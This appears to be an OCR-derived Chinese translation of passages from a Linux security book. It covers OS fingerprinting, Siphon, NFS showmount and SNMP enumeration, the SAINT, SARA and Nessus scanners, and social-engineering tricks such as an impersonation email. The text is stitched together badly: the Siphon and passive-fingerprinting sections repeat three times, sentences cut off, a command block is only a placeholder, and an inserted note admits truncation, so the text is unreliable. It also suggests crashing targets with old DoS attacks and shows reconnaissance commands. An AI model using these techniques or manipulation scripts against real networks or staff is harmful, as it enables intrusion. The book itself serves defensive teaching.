T6(Res=YDF-NF W=0 ACK=0 Flags=R)

T7(Res=YDF-NF W=0 ACK=0 Flags=R)

PU(Res=YDF-NF NTOS=CO IPLEN=164 RIPTL=148 RID=E RIPCK=EUCK EULEN=134 DAT)

Nmap 运行完成——扫描了 1 个 IP（主机在线）。

输出中的 OS 指纹详细说明了 Nmap 获取的响应。如果 Nmap 无法将这些内容与数据库匹配，它将提供一个 URL 供在随后的 Nmap 结果中使用。

> 但不要放弃，因为有一个解决方案。你可以简单从早期的 Windows DOS 攻击（死亡之钉、Winkuke 等）开始，然后稍微进一步尝试例如 TCP Ack 和 Land 等攻击。在每次攻击后，ping 看看是否

# 破解 Linux 揭秘：Linux 安全秘密与解决方案

它们已经崩溃了。当你最终崩溃时

尽管我们推崇这种 OS 探测方法，但我们必须承认，如果没有那些 Windows 机器，互联网将会是一个更安全的地方。

# 活跃指纹识别防御措施

如果你在你的机器前面放置一个防火墙，任何 OS 检测程序都应该报告防火墙本身的操作系统，这可能与你的实际机器不同。

诸如 `IPLOG`（一种数据包记录器）等工具（可在 `ojnk.sourceforge.net` 获取）允许你发送回专门设计用于欺骗 `Nmap` 宿机的回传包，并使其报告错误的 OS 结果。如果你想竭尽全力，可以安装 `ipersonality.sourceforge.net`（该工具仅适用于 2.4 内核），它通过 `netfilter` 和 `iptables` 工作，使你的机器能够伪装任何操作系统。

> **注意** 尽管此类工具可以运行，但它们可能会有性能或兼容性方面的缺陷。请谨慎使用。虽然向黑客拒绝提供信息是一件好事，但不应该进行到损害你自己机器的程度。默认的 Linux 网络栈仍在改进，做出更改可能会导致不符合标准或性能下降。

# 被动协议栈指纹识别

Lance Spitzer 发现，在许多情况下，仅通过观察踪迹就可以确定机器的操作系统。这种方法要求你的机器与目标之间已建立通信，但它不需要在任何入侵检测读取器中注册。

Lance 发现不同的操作系统对四个 IP 参数有不同的默认设置：`TTL`（存活时间）、`Window Size`（窗口大小）、`DF`（不分片位）和 `TOS`（服务类型）。通过将这些参数的值与数据库进行比较，你可以确定远程操作系统。

这种方法没有活跃活跃栈指纹识别可靠，因为它使用的值较少，需要实际连接，而且这些值很容易被主机操作系统更改。

# Siphon（虹）

| 流行度: | 5 |
|---|---|
| 简单性: | 7 |
| 影响: | 4 |
| 风险评分: | 5 |

`Siphon` 由 `subterr.net` 的人员开发，是一个可以在 UNIX 和 Windows 上运行的程序，它使用 `libcap` 主动监控接口并报告它能识别的所有机器。

```
hackerbox# /siphon -v i eth0 -o fingerprints.out
```

```
[ Siphon 项目：被动网络映射工具 ]
[ 版权所有 (c) 2000 Subterranean Security Group ]
```

运行在：'hackerbox' 运行 Linux 2.2.16 于 a(n) i386

使用设备：eth0

| 主机 | 端口 | TTL | DF | 操作系统 |
|---|---|---|---|---|
| 10.1.100.1 | 22 | 252 | ON | Solaris 2.6 - 2.7 |
| 10.1.100.2 | 993 | 63 | ON | Linux 2.1.112 - 2.2.14 |
| 10.1.100.28 | 143 | 61 | ON | Linux 2.1.112 - 2.2.14 |
| 10.1.100.5 | 22 | 64 | ON | FreeBSD 2.2.1 - 4.0 |
| 10.1.100.21 | 22 | 63 | ON | 40B0 |
| 192.168.96.109 | 22 | 50 | ON | 7BCF |
| 192.168.96.109 | 80 | 50 | ON | 7BCF |
| 10.1.100.4 | 143 | 64 | ON | FreeBSD 2.2.1 - 4.0 |
| 10.1.100.24 | 22 | 61 | ON | Linux 2.1.112 - 2.2.14 |
| 10.1.100.20 | 22 | 63 | ON | FreeBSD 2.2.1 - 4.0 |
| 10.1.100.8 | 22 | 255 | OFF | Solaris 2.6 - 2.7 |
| 192.168.147.17 | 25 | 242 | ON | 25BC |
| 10.1.100.9 | 21 | 32 | ON | Windows NT / Winx |

# 第 3 章：映射你的机器和网络



| 10.1.100.3 | 25 | 128 | OFF | Windows NT / Winx |

| 10.1.100.14 | 993 | 64 | OFF | FreeBSD 2.x |

指纹存储在 `osprints.conf` 文件中，其中包含约 50 个条目。你可以看到结果不如活跃指纹识别那样精确，后者可以更准确地缩小操作系统的实际版本。如果操作系统与指纹数据库中的条目不匹配，它会在操作系统字段中打印 Window Size。

# 被动协议栈指纹识别防御措施

你可以更改被被动指纹识别工具检查的 IP 选项的默认值，从而轻松防止。例如，要更改默认的 TTL：

```
# 示例命令
```

更改默认的 TTL 后，主机操作系统可以轻易更改这些值。虽然向黑客拒绝提供信息是一件好事，但不应该进行到损害你自己机器的程度。默认的 Linux 网络栈仍在改进，做出更改可能会导致不符合标准或性能下降。

# 被动协议栈指纹识别

Lance Spitzer 发现，在许多情况下，仅通过观察踪迹就可以确定机器的操作系统。这种方法要求你的机器与目标之间已建立通信，但它不需要在任何入侵检测读取器中注册。

Lance 发现不同的操作系统对四个 IP 参数有不同的默认设置：TTL（存活时间）、Window Size（窗口大小）、DF（不分片位）和 TOS（服务类型）。通过将这些参数的值与数据库进行比较，你可以确定远程操作系统。

这种方法没有活跃活跃栈指纹识别可靠，因为它使用的值较少，需要实际连接，而且这些值很容易被主机操作系统更改。

# Siphon（虹）

| 流行度: | 5 |

|---|---|

| 简单性: | 7 |

| 影响: | 4 |

| 风险评分: | 5 |

# 第 3 章：映射你的机器和网络

Siphon 由 subterr.net 的人员开发，是一个可以在 UNIX 和 Windows 上运行的程序，它使用 `libcap` 主动监控接口并报告它能识别的所有机器。

```
hackerbox# /siphon -v i eth0 -o fingerprints.out
```

```
[ Siphon 项目：被动网络映射工具 ]
[ 版权所有 (c) 2000 Subterranean Security Group ]
```

运行在：'hackerbox' 运行 Linux 2.2.16 于 a(n) i386

使用设备：`eth0`

| 主机 | 端口 | TTL | DF | 操作系统 |
|---|---|---|---|---|
| 10.1.100.1 | 22 | 252 | ON | Solaris 2.6 - 2.7 |
| 10.1.100.2 | 993 | 63 | ON | Linux 2.1.112 - 2.2.14 |
| 10.1.100.28 | 143 | 61 | ON | Linux 2.1.112 - 2.2.14 |
| 10.1.100.5 | 22 | 64 | ON | FreeBSD 2.2.1 - 4.0 |
| 10.1.100.21 | 22 | 63 | ON | 40B0 |
| 192.168.96.109 | 22 | 50 | ON | 7BCF |
| 192.168.96.109 | 80 | 50 | ON | 7BCF |
| 10.1.100.4 | 143 | 64 | ON | FreeBSD 2.2.1 - 4.0 |
| 10.1.100.24 | 22 | 61 | ON | Linux 2.1.112 - 2.2.14 |
| 10.1.100.20 | 22 | 63 | ON | FreeBSD 2.2.1 - 4.0 |
| 10.1.100.8 | 22 | 255 | OFF | Solaris 2.6 - 2.7 |
| 192.168.147.17 | 25 | 242 | ON | 25BC |
| 10.1.100.9 | 21 | 32 | ON | Windows NT / Winx |
| 10.1.100.3 | 25 | 128 | OFF | Windows NT / Winx |
| 10.1.100.14 | 993 | 64 | OFF | FreeBSD 2.x |

指纹存储在 `osprints.conf` 文件中，其中包含约 50 个条目。你可以看到结果不如活跃指纹识别那样精确，后者可以更准确地缩小操作系统的实际版本。如果操作系统与指纹数据库中的条目不匹配，它会在操作系统字段中打印 Window Size。

# 活跃指纹识别防御措施

如果你在你的机器前面放置一个防火墙，任何 OS 检测程序都应该报告防火墙本身的操作系统，这可能与你的实际机器不同。



诸如 `IPLOG`（一种数据包记录器）等工具（可在 `ojnk.sourceforge.net` 获取）允许你发送回专门设计用于欺骗 Nmap 宿机的回传包，并使其报告错误的 OS 结果。如果你想竭尽全力，可以安装 `ipersonality.sourceforge.net`（该工具仅适用于 2.4 内核），它通过 `netfilter` 和 `iptables` 工作，使你的机器能够伪装任何操作系统。

> 注意 尽管此类工具可以运行，但它们可能会有性能或兼容性方面的缺陷。请谨慎使用。虽然向黑客拒绝提供信息是一件好事，但不应该进行到损害你自己机器的程度。默认的 Linux 网络栈仍在改进，做出更改可能会导致不符合标准或性能下降。

# 被动协议栈指纹识别

Lance Spitzer 发现，在许多情况下，仅通过观察踪迹就可以确定机器的操作系统。这种方法要求你的机器与目标之间已建立通信，但它不需要在任何入侵检测读取器中注册。

Lance 发现不同的操作系统对四个 IP 参数有不同的默认设置：`TTL`（存活时间）、`Window Size`（窗口大小）、`DF`（不分片位）和 `TOS`（服务类型）。通过将这些参数的值与数据库进行比较，你可以确定远程操作系统。

这种方法没有活跃活跃栈指纹识别可靠，因为它使用的值较少，需要实际连接，而且这些值很容易被主机操作系统更改。

# Siphon（虹）

| 流行度: | 5 |
|---|---|
| 简单性: | 7 |
| 影响: | 4 |
| 风险评分: | 5 |

# 第 3 章：映射你的机器和网络

Siphon 由 `subterr.net` 的人员开发，是一个可以在 UNIX 和 Windows 上运行的程序，它使用 `libcap` 主动监控接口并报告它能识别的所有机器。

```
hackerbox# /siphon -v i eth0 -o fingerprints.out
```

```
[ Siphon 项目：被动网络映射工具 ]
[ 版权所有 (c) 2000 Subterranean Security Group ]
```

运行在：'hackerbox' 运行 Linux 2.2.16 于 a(n) i386

使用设备：`eth0`

| 主机 | 端口 | TTL | DF | 操作系统 |
|---|---|---|---|---|
| 10.1.100.1 | 22 | 252 | ON | Solaris 2.6 - 2.7 |
| 10.1.100.2 | 993 | 63 | ON | Linux 2.1.112 - 2.2.14 |
| 10.1.100.28 | 143 | 61 | ON | Linux 2.1.112 - 2.2.14 |
| 10.1.100.5 | 22 | 64 | ON | FreeBSD 2.2.1 - 4.0 |
| 10.1.100.21 | 22 | 63 | ON | 40B0 |
| 192.168.96.109 | 22 | 50 | ON | 7BCF |
| 192.168.96.109 | 80 | 50 | ON | 7BCF |
| 10.1.100.4 | 143 | 64 | ON | FreeBSD 2.2.1 - 4.0 |
| 10.1.100.24 | 22 | 61 | ON | Linux 2.1.112 - 2.2.14 |
| 10.1.100.20 | 22 | 63 | ON | FreeBSD 2.2.1 - 4.0 |
| 10.1.100.8 | 22 | 255 | OFF | Solaris 2.6 - 2.7 |
| 192.168.147.17 | 25 | 242 | ON | 25BC |
| 10.1.100.9 | 21 | 32 | ON | Windows NT / Winx |
| 10.1.100.3 | 25 | 128 | OFF | Windows NT / Winx |
| 10.1.100.14 | 993 | 64 | OFF | FreeBSD 2.x |

指纹存储在 `osprints.conf` 文件中，其中包含约 50 个条目。你可以看到结果不如活跃指纹识别那样精确，后者可以更准确地缩小操作系统的实际版本。如果操作系统与指纹数据库中的条目不匹配，它会在操作系统字段中打印 Window Size。

## 被动协议栈指纹识别防御措施

你可以更改被被动指纹识别工具检查的 IP 选项的默认值，从而轻松防止。例如，要更改默认的 TTL：

```
# 示例命令
```

更改默认的 TTL 后，主机操作系统可以轻易更改这些值。虽然向黑客拒绝提供信息是一件好事，但不应该进行到损害你自己机器的程度。默认的 Linux 网络栈仍在改进，做出更改可能会导致不符合标准或性能下降。

# 活跃指纹识别防御措施

# ENUMERATING RPC SERVICES

一类 RPC（远程过程调用）在网络上运行。黑客可以通过 `portmap` 轻松确定哪些服务在。

## 探测 portmap 守护进程

通过 `portmap`，黑客可以立即知道哪些服务在运行。

## 使用 Nmap 查找 RPC 服务

### 第 3 章：映射你的机器与网络

#### 使用 NFS共享文件

`NFS`（网络文件系统）是 Linux 机器通过网络共享文件的标准方式。客户端可以挂载服务器上的目录，此后对文件的访问就像访问本地存储一样。



NFS 自 1989 年由 Sun Microsystems 创建以来一直存在着。它经过了多次修订——版本 2 和 3 被广泛部署，而版本 4 正在开发中。它在设计上有许多缺陷，这些将在第 6 章中详细介绍。虽然有更好的文件共享替代方案，例如 AFS（安德鲁文件系统），但它们通常更难安装和管理。

正如我们之前所说的，黑客对你的设置了解得越多，他能用来实施攻击的信息就越多。知道你正在导出哪些文件系统是一项有用信息。黑客可能出于各种原因想要确定你正在导出哪些文件系统（从而也允许其他机器挂载）：

- `主机名`：黑客通过查看你导出文件系统的位置，可能确定你的网络上还有哪些其他主机。
- `信任主机`：通常会有一组允许以 root 身份挂载 NFS 卷的主机。如果黑客能够攻破这些机器，那么挂载的文件系统也会变得脆弱，并可能被用于对它们发动攻击。
- `导出文件系统列表`：获取导出文件系统的完整列表可以省去黑客猜测文件系统名称的时间，让他可以立即尝试利用。
- `已安装软件`：导出的文件系统通常用于方便软件分发，可能会揭示你站点使用的哪些程序，以便对其进行滥用。

### 使用 showmount 查询 NFS

| 流行度 | 7 |
| :--- | :--- |
| 简易性 | 8 |
| 影响 | 6 |
| 风险等级 | 7 |

你可以远程运行 `showmount` 命令来查询 NFS 服务器。它不仅会显示导出了哪些系统以及哪些选项，还会显示哪些机器正在挂载这些文件系统。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_142_0.png)

## 破解 Linux 攻击：Linux 安全秘密与解决方案

```
hackerbox$ host target.example.com
target.example.com has address 208.283.10.15
```

```
hackerbox$ showmount -a target
All mount points on target:
curly:/home/brenda
curly:/usr/local/packages/gnupg-1.0.1
curly:/usr/local/packages/openssh-2.1
larry:/home/harper
larry:/opt/pkgs
larry:/usr/local
moe:/home/george
moe:/home/bonnie
moe:/usr/local/pkgs/emacs-20.5.1
moe:/nfs/manpages
```

每一行列出了主机名及其挂载的文件系统。它没有指定是哪台机器在挂载 NFS 分区，但通常是同一个目录。你还可以获取每个导出的文件系统列表，包括哪些主机允许挂载它们：

```
hackerbox$ showmount -e target
Export list for target:
/home (everyone)
/usr/local/pkgs @10.1/16,.example.com
/usr/local larry.example.com
/n/nfs example.com
/opt/pkgs larry.example.com
```

枚举操作无法显示每个文件系统上设置了哪些导出选项——例如，哪些主机可以以 root 身份挂载、root ID 映射到什么等——但它确实列出了所有能够挂载这些目录的机器。

从列出的文件系统来看，nfsserver 正在向各种 NFS 客户端提供各种文件。根据输出，你可以得出几个结论。

**网络拓扑**：目标的 IP 地址为 208.283.10.15。然而，它允许 10.1.0.0/16 的机器挂载某些文件系统。因此，这台机器可能是双网段的，你现在知道了内部网络号。

**额外的主机名**：你获得了一个主机名列表（larry, moe 和 curly），甚至不需要尝试任何 DNS 技巧。

**可能的软件配置**：在 `/home` 分区下，注意每台机器（larry, moe 和 curly）都挂载了一个或多个用户主目录。这些机器可能运行着自动挂载（automounter）。针对这三台机器尝试旧的自动挂载漏洞是一个不错的选择。

**用户名**：挂载的 `/home/username` 分区表明存在名为 branca、harper、george 和 bonnie 的用户。这在以后可能有用，例如用于网络密码破解。

**木马潜力**：他们似乎在 NFS 服务器上安装软件（`/opt/pkgs`, `/usr/local` 和 `/usr/local/pkgs`）并将其挂载到每台机器上。这可能是为了节省时间，允许他们只安装一次软件并让所有机器可用。这意味着如果有方法修改这些文件系统，就可以通过运行挂载目录中的程序来使所有机器都被攻破。这可以为黑客节省大量时间。

**不安全的导出选项**：`/home` 分区对外开放。如果有方法修改这些文件系统，就可以通过运行挂载目录中的程序来使所有机器都被攻破。这可以为黑客节省大量时间。

**软件版本**：我们还能看到正在运行的程序。

**防御措施**：应该有良好的防火墙（或 `iptables` 规则）。

# 第 3 章：映射你的机器与网络

## 使用 Net-snmp 查询 SNMP

| 流行度 | 6 |
| --- | --- |
| 简单性 | 8 |
| 影响力 | 6 |
| 风险评分 | 7 |

我们最喜欢的 SNMP 包是 `net-snmp`，它以前被称为 `ucd-snmp`。假设目标 `target.example.com` 机器上运行着一个 SNMP 服务器，黑客可以使用 `snmpget` 如下所示命令查询特定条目：

```
snmpget target.example.com public system.sysName.0
sysName.0 = target
```

然而，使用 `snmpwalk` 获取 MIB 的内容要快得多：



```
snmpwalk target.example.com public
sys.sysDesc.0 = Linux target 2.2.178 #1 SMP
sys.sysContact.0 = root@example.com.800.555.7700
sysName.0 = target
sys.Location.0 = 1221 Avenue of the Americas, New York, NY 10020
interfaces.ifTable.ifEntry.ifEntry.type = 1 = softwareLoopback(24)
interfaces.ifTable.ifEntry.ifEntry.type = 2 = ethernetSmac(6)
interfaces.ifTable.ifEntry.ifEntry.type = 3 = ethernetSmac(6)
interfaces.ifTable.ifEntry.ifEntry.ifAddress.2 = 00:80:80:75:b5:d4
interfaces.ifTable.ifEntry.ifEntry.ifAddress.3 = 00:80:80:6a:df:64
interfaces.ifTable.ifEntry.ifEntry.ifMtu.1 = 3924
interfaces.ifTable.ifEntry.ifEntry.ifMtu.2 = 1500
interfaces.ifTable.ifEntry.ifEntry.ifMtu.3 = 1500
interfaces.ifTable.ifEntry.ifEntry.ifAdminStatus.1 = up(1)
interfaces.ifTable.ifEntry.ifEntry.ifAdminStatus.2 = up(1)
interfaces.ifTable.ifEntry.ifEntry.ifAdminStatus.3 = down(2)
at.atTable.atEntry.atPhysAddress.1.1.10.10.1.1 = Hex: 00 80 80 34 A5 01
at.atTable.atEntry.atPhysAddress.1.1.10.10.1.4 = Hex: 00 80 80 06 AG F
at.atTable.atEntry.atPhysAddress.1.1.10.10.1.5 = Hex: 00 80 80 66 CE C4
at.atTable.atEntry.atPhysAddress.1.1.10.10.1.7 = Hex: 00 80 80 58 99 08
at.atTable.atEntry.atNetAddress.1.1.10.10.1.1 = IPAddress: 10.10.1.1
at.atTable.atEntry.atNetAddress.1.1.10.10.1.4 = IPAddress: 10.10.1.4
at.atTable.atEntry.atNetAddress.1.1.10.10.1.5 = IPAddress: 10.10.1.5
at.atTable.atEntry.atNetAddress.1.1.10.10.1.7 = IPAddress: 10.10.1.7
at.Table,atEntry,atAddress.1.1.10.10.1.8 = IPAddress: 10.10.1.8
ip,ipAddrTable,ipAddrEntry,ipAddrAddr.10.10.1.42 = IPAddress: 10.10.1.42
ip,ipRouteTable,ipRouteEntry,ipRouteDest.0.0.0.0 = IPAddress: 0.0.0.0
ip,ipRouteTable,ipRouteEntry,ipRouteDest.10.10.1.0 = IPAddress: 10.10.1.0
ip,ipRouteTable,ipRouteEntry,ipRouteNextHop.0.0.0.0 = IPAddress: 10.10.1.1
ip,ipRouteTable,ipRouteEntry,ipRouteNextHop.10.10.1.0 = IPAddress: 0.0.0.0
ip,ipRouteTable,ipRouteEntry,ipRouteMask.0.0.0.0 = IPAddress: 0.0.0.0
ip,ipRouteTable,ipRouteEntry,ipRouteMask.10.10.1.0 = IPAddress: 255.255.255.0
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.21.0.0.0.0 = list(2)
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.22.0.0.0.0 = list(2)
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.25.0.0.0.0 = list(2)
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.80.0.0.0 = list(2)
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.443.0.0.0 = list(2)
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.22.0.0.0 = list(2)
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.21.0.0.0 = list(2)
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.25.0.0.0 = list(2)
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.13.0.0.0 = list(2)
tcp,tcpConnTable,tcpConnEntry,tcpConnState.0.0.0.0.11.0.0.0 = list(2)
```

- 拒绝服务攻击
- CGI 漏洞
- 网络服务缓冲区溢出
- POP 客户端攻击

`SAINT` 还清理了 `SATAN` 的代码，并使用户界面更加漂亮，如图 3-2 所示。`SAINT` 仍在维护中，是检查系统的良好工具。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_150_0.png)

# 第 3 章：映射你的机器和网络

## SARA

| 流行度 | 8 |
| :--- | :--- |
| 简单程度 | 8 |
| 影响力 | 9 |
| 风险评分 | 8 |

`SAINT` 的原始作者 `Bob Todd` 于 1999 年加入了高级研究公司，并开始了 Satan 套件的第三代。`SARA`——安全审计研究助手——基于之前的 `Satan`/`SAINT` 模型，但正如表 3-3 所示，在几个方面进行了扩展。

此外，`SARA` 是唯一经过 `ISTS` 和 `SANS` 官方认证、能够扫描所有 `SANS` 前十大漏洞的工具。

| 特性 | 描述 |
| :--- | :--- |
| 守护进程模式 | `SARA` 将监听网络端口上，允许从管理主机远程按需运行。 |
| CVE 标准支持 | `CVE`（常见漏洞与披露）旨在标准化漏洞和安全暴露的命名，使你能够轻松查找到特定漏洞的描述和应对措施。可以在 `cve.mitre.org` 获取更多信息。 |
| 每月更新两次 | 自 1999 年 5 月创建以来，`SARA` 一直保持每月更新两次，并希望继续保持这一速度。 |
| 用户扩展支持 | 可以轻松地将自定义测试集成到 `SARA` 中。`Satan`/`SAINT` 模块仅需极少更改即可工作。 |
| 命令行/GUI 执行 | 提供了健壮的 GUI（通过 HTTP）和命令行执行环境。 |
| 改进的报告 | `SARA` 有了一个新的报告生成器，能够以带有多个表格的更易读的格式列出来自 `SATAN` 的所有可用信息。（也提供报告模块来集成 `Satan` 或 `SAINT`。） |

表 3-3. `SARA` 提供的扩展功能

## Nessus

| 流行度 | 9 |
| :--- | :--- |
| 简单程度 | 10 |
| 影响力 | 9 |
| 风险评分 | 9 |

`Nessus` 可能是目前最先进的网络扫描器。`Nessus` 由 `Renaud Deraison` 编写，既易用又强大。它包含一种自的名为 `NASL`（`Nessus` 攻击脚本语言）的内置编程语言，可以用最少的代码创建强大的攻击。（你也可以创建用 C 编写的攻击，但 `Nessus` 更具可移植性，且大部分工作已经为你做好了。）



Nessus 是一个完全开源的产品，可以通过 `CVS` 获取最新版本（也提供即插即用的 `RPM` 包）。它被设计为客户端-服务器模型。Nessus 服务器是控制攻击行为本身的引擎。Nessus 客户端是一个非常直观的 GUI，你可以在从中选择要扫描哪些主机以及尝试哪些攻击。服务器将尝试并行探测尽可能多的机器。

> 实际上有三个 GUI 客户端供选择——一个用于 X11 的客户端（需要 `gtk` 工具包）、一个 Java 客户端和一个 Win32 客户端。你还可以通过指定用户名、机器列表和输出文件等各种参数从命令行运行 Nessus。

攻击插件每天更新，并通过 Web 或 `CVS` 提供。Nessus 主要致力于检查新的安全漏洞；因此，使用其中一个旧的网络扫描器对你的机器进行检查也是个好主意。Nessus 拥有网络扫描器中最先进的功能：

- 协作工作的插件：测试可以告诉它成功需要什么条件。对于任何需要匿名访问的不安全性，如果之前的测试显示不需要匿名访问，则测试不会运行。

# 破解 Linux 深度揭秘：Linux 安全秘密与解决方案

排除任何针对 Linux 机器的 Windows 测试。Nessus 在设计时已确保不会执行任何不必要的测试，因此没有必要花时间手动缩减扫描范围。然而，你可能希望避免运行任何拒绝服务扫描，因为它们可能会导致易受攻击的机器宕机。

- 6. **开始扫描**。观察 Nessus 如何并行扫描你的机器，如图 3-5 所示。如果你需要，如果某个主机响应太慢，可以停止对单个主机的扫描。
- 7. **查看报告**。Nessus 报告非常详尽。它们包含了对每个发现的安全漏洞的级别（低、中、高、严重），以及如何修复问题的信息信息和注释。
- 8. **保存报告**。保存报告始终是一个好主意，以便以后进行比较。最容易比较的格式是 `.nsr` 格式，它是纯文本格式，可以使用 `diff` 轻松与旧结果进行比较，如图 3-6 所示。
- 9. **修复任何漏洞**。在黑客扫描你并亲自利用它们之前，修复扫描器发现的安全问题。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_155_0.png)

图 3-5 运行 Nessus 扫描

# 第 3 章：映射你的机器和网络

# 125

## 总结

| 测试的主机数量 | 9 |
|---|---|
| 发现 31 个安全漏洞 | |
| 发现 36 个安全警告 | |
| 发现 31 个安全注释 | |

- - ssh (22/tcp)
- time (37/tcp)
- domain (53/udp)
- 安全注释
- 远程 bind 版本为：8.2.2-P5
- www (80/tcp)
- 安全注释
- 安全警告
- 安全漏洞
- 10.4.0.4
- 10.4.0.7
- 10.4.0.1
- 10.4.0.2
- 10.4.0.3
- 10.4.0.8
- 10.4.0.9
- 10.4.0.8

目录 `/cgi-bin-sdb/` 是 `/cgi-bin` 的别名——大多数 SUSE 系统都是这样配置的

此设置允许攻击者获取此服务器上安装的 CGIs 的源代码，这是危险的，因为它提供了更多关于主机设置的知识，甚至如果 CGIs 包含硬编码的用户名和密码，就可以获得访问权限

```
在 httpd.conf 中，将指令
Alias /cgi-bin-sdb=/usr/local/httpd/cgi-bin/
改为
ScriptAlias /cgi-bin-sdb=/usr/local/httpd/cgi-bin/
风险因素：严重。
```

请求以 "www-cgi-dump" 结尾的 URL 会使 Netscape 服务器转储页面列表

| 排序端口 | 另存为... | 另存为 NSR | 关闭 |

图 3-6 Nessus 漏洞扫描结果

![](img/33829ffb1435b4baef56fcd2c28ec6cd_156_0.png)

## 网络扫描器应对措施

有一种简单的应对措施可以保护你，你应该用网络扫描器扫描你的机器——首先扫描自己的系统。如果你持续使用各种扫描器，你将获得与黑客相同的结果。确保解决扫描器报告的任何问题，然后扫描就会给你提示。

为了在扫描进行时获得警告，你可以使用第 2 章列出的任何扫描检测器，或者采用入侵检测系统或软件来提醒你活动扫描。互联网上的主机经常被扫描——即使是你无关紧要的机器每天也会不少于 10 次扫描——利用资源的最佳方式是确保你的机器软件始终更新。

# 总结

我们涵盖了黑客在发起实际攻击之前用来了解你系统的各种方法。某些威胁是完全可以防止的，例如让你的机器对 ping 扫描（ping sweeps）无响应。另一些则无法防止——例如对有效域名 WHO 信息的查询。然而，通过谨慎允许他人通过在线渠道了解你的机器和网络，你可以从很大程度上防止黑客轻松获取信息，这些信息会增加他们攻击成功的概率。

# 第二部分

![](img/33829ffb1435b4baef56fcd2c28ec6cd_158_0.png)

127

# 第 4 章

# 社会工程、木马和其他黑客诡计

# 破解 Linux 深度揭秘：Linux 安全秘密与解决方案

黑客通常被描绘成脸色苍白、安静、社交能力拙的电脑极客，在凌晨 3 点坐在家里阅读数千行代码以寻找攻击点，通过调制调器侵入计算机，并在不与其他人类互动的情况下完成所有非法活动。然而，有效的黑客经常采用让你自己完成所有肮脏工作的方法。本章展示了黑客如何骗你绕过自己的安全防护，从而让他们轻松获取你的宝贵...

## 社会工程

想象来自互联网服务提供商 (ISP) 给其一个用户的一个简单电话：

| ISP: 你好，我是安全部门的 Rachel Kiev |
| SL: 我是 Rachel |

*(注：由于原文后半部分存在严重的 OCR 重复和错误，此处已根据逻辑截断。)*

# 深度破解 Linux：Linux 安全秘密与解决方案

## 冒充 (Impersonation)

| 流行度 | 7 |
| 简单程度 | 4 |
| 影响范围 | 8 |
| 风险等级 | 6 |

冒充与“虚假权威”相似，黑客都希望让别人相信他们有权让别人执行其指令。冒充是虚假权威的一种形式，黑客采用某个真实人物的身份。

当黑客站在你面前时，他们很难冒充你认识的人；然而，黑客在电话里、聊天室或即时消息软件中冒充他人要容易得多。黑客可能通过阅读邮件来模仿他人的写作风格，并拥有足够的个人信息来营造黑客是你朋友的幻象。在让对方相信黑客正是其所声称身份后，黑客通常会请求某些来自那个人看来并不可疑的信息或访问权限。

```
From:not_my_normal_email@example.com
To: security department
```

嘿，我是 John。如你所知，我这周在度假，但我今天真的需要处理我的邮件。防火墙不让我进入，因为我正从奥胡岛而不是家里登录。你能帮我开放我这里 IP 地址的访问权限吗？

地址是 10.10.27.15。一旦我进去，我会从我真实的内部邮箱地址发送邮件，但为了让你知道一下，我的员工编号是 HZ212618-0。

即使我们不得不承认，我们也可能成为这种攻击的受害者。有时，当同事去新的客户现场，被隔离在一个没有手机信号的服务器集群中时，我们确实收到过像这里这样的邮件并允许了访问。幸运的是这些请求是真实的，但为了速度，我们同样可能被欺骗。

## 同情 (Sympathy)

| 流行度 | 7 |
| 简单程度 | 7 |
| 影响范围 | 8 |
| 风险等级 | 7 |

黑客使用的最可靠的方法之一是让自己看起来非常需要他们所请求的任何东西——让别人对他们产生同情并帮助他们。假设某人来到市场部，说他需要重置密码，否则他无法及时交出东西，老板会杀了他。特别是如果他讲述了一个冗长且复杂的故事，管理员通常会产生同情心并尽力帮助，可能忘记了她应该检查并确保这确实是正确的员工，从而未能遵循旨在防止此类攻击的策略。

同情策略是数百万人在日常生活中使用的手段，黑客同样可以利用它来获取有帮助的信息。

## 个人利益 (Personal Stake)

| 流行度: 6 |
| 简单程度: 6 |
| 影响范围: 8 |
| 风险等级: 7 |

黑客可能会发现，如果他们编写一个影响受操纵者的场景，就能获得更多的配合。例如，如果黑客的骗局是真的且会对受害者产生问题，那么黑客得到的支持可能比使用同情策略得多。

### 工资发放问题 (Problems with the Payroll)

一名卧底的安全顾问装成财务部的员工接触了某系统管理员，声称她无法进入系统。一旦她解释说需要运行一些关键进程，否则工资将延迟，管理员就给了她比需要多得多的访问权限，以绝对确保工资（以及管理员的支票）的发放不会有任何障碍。

## 满足虚荣心 (Boosting Egos)

| 流行度: 7 |
| 简单程度: 8 |
| 影响范围: 8 |
| 风险等级: 8 |

让某人感觉良好往往会让他们更容易被操纵。当人们受到赞美时，他们希望继续被赞美，并会放松防备以换取更多的赞奖。

## 个性化之旅 (A Personalized Tour)



一名黑客走进一位热情的经理的办公室。她说服了经理自己是市场部的新员工，对从程序员的角度查看产品感兴趣。她能够为经理提供一小时的深度讲解，介绍了公司产品是如何开发的、代码存储在哪里以及哪些程序在哪些机器上运行，她甚至通过表现出兴趣和好奇，并夸赞他的工作安排得如此完美，从而获得了一份网络拓扑图副本。

那位轻信的经理实际上概述了哪些机器应该首先被攻击，以及弱点在哪里。如果信息还不够，演示的一部分还包括他输入了好几次密码。任何合格的黑客都知道如何在不显眼的情况下观察别人输入密码。原本可能需要几天的端口扫描和 Ping 扫描（这可能会触发许多自动警报）才能确定的信息，而现在却是对方自愿提供的咖啡和聊天。

## 不显眼的职业 (Inconspicuous Occupation)

| 流行度: | 7 |
| 简单程度: | 9 |
| 影响范围: | 9 |
| 风险等级: | 8 |

黑客可以通过装成当地燃气公司、电力公司、电信公司或环境服务部门的人员来进入通常禁止的区域。这些职业的人似乎自带某种隐形护盾——除非绝对必要，否则他们不会被注意到。这对于想要窥探并冒充的黑客来说是完美的职业选择。黑客通过这种方式进行冒充是常有的。

# 第 4 章：社会工程、木马和其他黑客诡术

## 验证来源 (Verify the Source)

